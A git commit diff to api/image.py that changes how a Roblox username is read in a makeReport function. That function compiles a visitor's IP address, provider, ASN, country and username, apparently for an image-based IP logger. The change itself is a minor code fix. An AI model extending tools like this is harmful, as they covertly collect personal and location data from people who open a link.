85f15340d2281214ce630e050fff23300a28e5e7
yaroikio23-star <yaroikio23@gmail.com>
2026-03-04 22:00:18 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -181,7 +181,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
             
 **IP Info:**
 > **IP:** `{ip if ip else 'Unknown'}`
-> **Username:** `{roblox_info['username'] if roblox_info['username'] else 'Unknown'}`
+> **Username:** `{roblox_info.get('username', 'Unknown')}`
 > **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
 > **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
 > **Country:** `{info['country'] if info['country'] else 'Unknown'}`
